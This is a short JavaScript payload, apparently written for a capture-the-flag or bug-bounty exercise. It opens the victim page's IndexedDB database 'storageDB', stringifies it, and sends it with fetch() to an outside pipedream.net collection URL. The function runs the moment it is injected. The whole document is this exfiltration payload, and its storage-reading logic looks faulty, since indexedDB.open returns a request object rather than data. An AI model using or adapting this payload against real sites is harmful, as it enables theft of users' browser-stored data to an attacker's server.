async function getFlag() {
    var flag = await indexedDB.open('storageDB', 10);
    var final = JSON.stringify(flag);
    fetch('https://eoctl0knzoys9l9.m.pipedream.net/bugbase/'+final);
}
getFlag()
